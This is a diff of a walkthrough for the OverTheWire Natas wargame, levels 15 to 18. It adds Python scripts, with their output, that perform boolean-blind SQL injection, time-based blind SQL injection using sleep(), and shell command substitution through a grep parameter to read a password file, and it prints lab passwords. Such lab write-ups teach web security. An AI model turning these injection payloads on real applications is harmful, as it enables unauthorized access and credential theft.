@@ -91,7 +91,7 @@ natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 ```
 Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
 ```
-Looks like the page is filtering based on the HTML Referer header. We can fire up an intercepting proxy like `Burp Suite` to spoof these or manually send a http request with a tool like `curl`. I'm guessing burp will come in handy later so let's get that set up.
+Looks like the page is filtering based on the HTTP Referer header. We can fire up an intercepting proxy like `Burp Suite` to spoof these or manually send a http request with a tool like `curl`. I'm guessing burp will come in handy later so let's get that set up.
 
 The default request looks like
 ```
@@ -557,4 +557,280 @@ if(array_key_exists("username", $_REQUEST)) {
 } else { 
 ?> 
 ```
-Setting `username= " or 1 = 1 -- ` gives us this user exists, but we aren't closer to the password. `username=natas16` also exists, so looks like we will have to do a blind injection.
+Setting `username= " or 1 = 1 -- ` (note the trailing space) gives us this user exists, but we aren't closer to the password. `username=natas16` also exists, so looks like we will have to do a blind injection.
+
+If we try `natas16" AND password = "a" -- ` this user does not exist.
+
+If we try `natas16" AND password IS NOT NULL -- ` we get a this user exits.
+
+Knowing we can test against the password and using one of several SQL statements (LIKE BINARY, strcmp) we can check each character until we reach the correct password.
+
+Let's write a python script to a handle this.
+
+```python
+import requests
+
+user = 'natas15'
+password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
+url = 'http://natas15.natas.labs.overthewire.org/index.php'
+alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+passwd = ''
+
+for i in range(0,32):
+    for char in alphas:
+        sql = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char  + '%" -- '}
+        r= requests.post(url, auth=(user, password), data=sql)
+        if 'exists' in r.text:
+            passwd += char
+            print(passwd)
+            break
+```
+Running it gives
+```
+W
+Wa
+WaI
+WaIH
+WaIHE
+WaIHEa
+WaIHEac
+WaIHEacj
+WaIHEacj6
+WaIHEacj63
+WaIHEacj63w
+WaIHEacj63wn
+WaIHEacj63wnN
+WaIHEacj63wnNI
+WaIHEacj63wnNIB
+WaIHEacj63wnNIBR
+WaIHEacj63wnNIBRO
+WaIHEacj63wnNIBROH
+WaIHEacj63wnNIBROHe
+WaIHEacj63wnNIBROHeq
+WaIHEacj63wnNIBROHeqi
+WaIHEacj63wnNIBROHeqi3
+WaIHEacj63wnNIBROHeqi3p
+WaIHEacj63wnNIBROHeqi3p9
+WaIHEacj63wnNIBROHeqi3p9t
+WaIHEacj63wnNIBROHeqi3p9t0
+WaIHEacj63wnNIBROHeqi3p9t0m
+WaIHEacj63wnNIBROHeqi3p9t0m5
+WaIHEacj63wnNIBROHeqi3p9t0m5n
+WaIHEacj63wnNIBROHeqi3p9t0m5nh
+WaIHEacj63wnNIBROHeqi3p9t0m5nhm
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+Pretty cool. We could have optimised this script by searching for matching characters anywhere in the password first by constructing the query `'username' : 'natas16" and password LIKE BINARY "%' + char  + '%" -- '` and then passing the resulting filtered string to our character search, but honestly it was pretty quick regardless.
+
+## Level 16
+
+Level 16 looks the same as level 9 and 10, but with more input filtering.
+
+At the moment our input is passed into a grep string like bellow
+
+`grep -i "our input" dictionary.txt`
+
+Our input is wrapped `""` preventing the earlier attacks. Still `$,(,),` are not filtered, so we should be able to perform command substitution.
+
+In level 15 we used a boolean based blind injectection against SQL. This means we perform an SQL query and from the output we can determine if it was true or false. Using this boolean value we test against the each letter in the password string for possible characters and eventually determine the entire password.
+
+This time we're performing a similar attack, posting a query to get a true or false value determined by interpreting the response, except it is against a bash passthrough. Let's break out a python script again.
+
+```python
+import requests
+
+user = 'natas16'
+password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
+url = 'http://natas16.natas.labs.overthewire.org/'
+alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+filtered = ''
+passwd = ''
+
+for char in alphas:
+    brute_string = 'needle=$(grep ' + char + ' /etc/natas_webpass/natas17)hackers'
+    r= requests.post(url, auth=(user, password), params=brute_string)
+    if 'hackers' not in r.text:
+        filtered += char
+        print(filtered)
+
+for i in range(32):
+    for char in filtered:
+        brute_string = 'needle=$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)hackers'
+        r = requests.post(url, auth=(user, password), params=brute_string)
+        if 'hackers' not in r.text:
+            passwd = passwd + char
+            print(passwd)
+            break
+```
+Notice we used a second loop to filter the characters first for speed like we discussed above. Gives the output
+```
+b  
+bc  
+bcd  
+bcdg  
+bcdgh  
+bcdghk  
+bcdghkm  
+bcdghkmn  
+bcdghkmnq  
+bcdghkmnqr  
+bcdghkmnqrs  
+bcdghkmnqrsw  
+bcdghkmnqrswA  
+bcdghkmnqrswAG  
+bcdghkmnqrswAGH  
+bcdghkmnqrswAGHN  
+bcdghkmnqrswAGHNP  
+bcdghkmnqrswAGHNPQ  
+bcdghkmnqrswAGHNPQS  
+bcdghkmnqrswAGHNPQSW  
+bcdghkmnqrswAGHNPQSW3  
+bcdghkmnqrswAGHNPQSW35  
+bcdghkmnqrswAGHNPQSW357  
+bcdghkmnqrswAGHNPQSW3578  
+bcdghkmnqrswAGHNPQSW35789  
+bcdghkmnqrswAGHNPQSW357890  
+8  
+8P  
+8Ps  
+8Ps3  
+8Ps3H  
+8Ps3H0  
+8Ps3H0G  
+8Ps3H0GW  
+8Ps3H0GWb  
+8Ps3H0GWbn  
+8Ps3H0GWbn5  
+8Ps3H0GWbn5r  
+8Ps3H0GWbn5rd  
+8Ps3H0GWbn5rd9  
+8Ps3H0GWbn5rd9S  
+8Ps3H0GWbn5rd9S7  
+8Ps3H0GWbn5rd9S7G  
+8Ps3H0GWbn5rd9S7Gm  
+8Ps3H0GWbn5rd9S7GmA  
+8Ps3H0GWbn5rd9S7GmAd  
+8Ps3H0GWbn5rd9S7GmAdg  
+8Ps3H0GWbn5rd9S7GmAdgQ  
+8Ps3H0GWbn5rd9S7GmAdgQN  
+8Ps3H0GWbn5rd9S7GmAdgQNd  
+8Ps3H0GWbn5rd9S7GmAdgQNdk  
+8Ps3H0GWbn5rd9S7GmAdgQNdkh  
+8Ps3H0GWbn5rd9S7GmAdgQNdkhP  
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPk  
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq  
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9  
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c  
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+```
+
+## Level 17
+
+This looks the same as Level 15. Let's check out the source code.
+
+```
+<? 
+
+/* 
+CREATE TABLE `users` ( 
+  `username` varchar(64) DEFAULT NULL, 
+  `password` varchar(64) DEFAULT NULL 
+); 
+*/ 
+
+if(array_key_exists("username", $_REQUEST)) { 
+    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
+    mysql_select_db('natas17', $link); 
+     
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
+    if(array_key_exists("debug", $_GET)) { 
+        echo "Executing query: $query<br>"; 
+    } 
+
+    $res = mysql_query($query, $link); 
+    if($res) { 
+    if(mysql_num_rows($res) > 0) { 
+        //echo "This user exists.<br>"; 
+    } else { 
+        //echo "This user doesn't exist.<br>"; 
+    } 
+    } else { 
+        //echo "Error in query.<br>"; 
+    } 
+
+    mysql_close($link); 
+} else { 
+?>
+```
+The only difference is all output is commented out. When an SQL query does not give output but is injectable, the options left are sending data back over the network or time based attacks. As networking options are limited in Natas, let's try a time  attack. Basically we submit a bunch of boolean queries with sleep() functions in them, if any take a longer time to come back then the boolean tested true. We use this true result to determine the password one character at a time like the earlier levels.
+
+Let's modify our python script from Level 15.
+
+```python
+import requests
+
+user = 'natas17'
+password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
+url = 'http://natas17.natas.labs.overthewire.org/index.php'
+alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+passwd = ''
+
+for i in range(0,32):
+    for char in alphas:
+        sql = {'username' : 'natas17" and password LIKE BINARY "' + passwd + char  + '%" and sleep(5) -- '}
+        r= requests.post(url, auth=(user, password), data=sql)
+        if (r.elapsed.seconds >= 10):
+            passwd += char
+            print(passwd)
+            break
+```
+And we should get
+```
+x  
+xv  
+xvK  
+xvKI  
+xvKIq  
+xvKIqD  
+xvKIqDj  
+xvKIqDjy  
+xvKIqDjy4  
+xvKIqDjy4O  
+xvKIqDjy4OP  
+xvKIqDjy4OPv  
+xvKIqDjy4OPv7  
+xvKIqDjy4OPv7w  
+xvKIqDjy4OPv7wC  
+xvKIqDjy4OPv7wCR  
+xvKIqDjy4OPv7wCRg  
+xvKIqDjy4OPv7wCRgD  
+xvKIqDjy4OPv7wCRgDl  
+xvKIqDjy4OPv7wCRgDlm  
+xvKIqDjy4OPv7wCRgDlmj  
+xvKIqDjy4OPv7wCRgDlmj0  
+xvKIqDjy4OPv7wCRgDlmj0p  
+xvKIqDjy4OPv7wCRgDlmj0pF  
+xvKIqDjy4OPv7wCRgDlmj0pFs  
+xvKIqDjy4OPv7wCRgDlmj0pFsC  
+xvKIqDjy4OPv7wCRgDlmj0pFsCs  
+xvKIqDjy4OPv7wCRgDlmj0pFsCsD  
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDj  
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh  
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd  
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+```
+Again we could do the optimisation where we find filtered characters first like we did in Level 16.
+
+## Level 18
+
+```php
+function print_credentials() {
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
+    print "You are an admin. The credentials for the next level are:<br>"; 
+    print "<pre>Username: natas19\n"; 
+    print "Password: <censored></pre>"; 
+    } else { 
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
+    } 
+}
+```
